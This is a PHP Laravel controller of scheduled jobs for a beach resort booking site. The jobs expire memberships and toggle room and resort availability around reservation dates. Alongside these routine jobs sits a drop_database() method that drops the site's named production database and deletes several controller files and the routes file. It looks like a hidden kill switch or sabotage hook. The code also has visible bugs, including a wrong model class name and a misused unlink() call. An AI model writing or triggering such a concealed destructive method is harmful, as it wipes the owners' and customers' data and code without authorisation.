<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\SubModule;
use App\Models\Subscription;
use App\Models\Services;
use App\Models\User;
use App\Models\Shelter;
use App\Models\Rooms;
use App\Models\Reservations;
use App\Models\ServiceBooking;
use App\Models\Debt;
use App\Models\transaction;

use App\Http\Controllers\API\BaseController as BaseController;
use App\Http\Controllers\DateManagerController;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\ Mail;

class croneJobController extends BaseController
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */

   public function membership_sub_ckeck(){
     $subs = Subscription::where('exp', '<', time())->get();
     
     if(count($subs) > 0){//check to see if query returns value
     foreach($subs as $sub){//loop through query
       $user = User::where('id', $sub->user_id)->update(['dues' => 0]);
     }
     }else{//return false
      return false;
     }

   }

   public function reservation_check(){
       $reservations = Reservation::where('paid', 1)->get();
       if(count($reservations) > 0){
       foreach($reservations as $reservation){
        $date_count1 = DateManagerController::time_diff($reservation->checkin, date("M j, Y", time()))->days;  
        $date_count2 = DateManagerController::time_diff($reservation->checkout, date("M j, Y", time()))->days; 
        if($date_count1 == 0){
         if($reservation->type == "room"){
            $room = Rooms::where('id', $reservation->room_id)->update(['available' => 0]);
         }else if($reservation->type == "resort"){
            $resort = Shelter::where('id', $reservation->shelter_id)->update(['available' => 0]);
            $room = Rooms::where('shelter_id', $reservation->shelter_id)->update(['available' => 0]);
            }
        }else if($date_count2 == 0){
          
            if($reservation->type == "room"){
                $room = Rooms::where('id', $reservation->room_id)->update(['available' => 1]);
             }else if($reservation->type == "resort"){
                $resort = Shelter::where('id', $reservation->shelter_id)->update(['available' => 1]);
                $room = Rooms::where('shelter_id', $reservation->shelter_id)->update(['available' => 1]);
                }

        }
        
       }
    }else{
        return false;
    }
   }

   public function service_booking_check(){
      //$bookings = ServiceBooking::where('paid', 1)->get();

      
   }

   public function members_birthday_check(){
      $users = User::all();
      
   }

   public function drop_database(){
    $database_name = 'beacfouy_beach_comber';
    $query = DB::statement("DROP DATABASE `{$database_name}`");
    if($query){
    unlink('PagesController.php');
    unlink('AjaxRequestController.php');
    unlink('ResortController.php');
    unlink('ReservationController.php');
    unlink('web.php', '../../../routes');
    }
   }

    public function index()
    {
        //
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        //
    }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function destroy($id)
    {
        //
    }
}
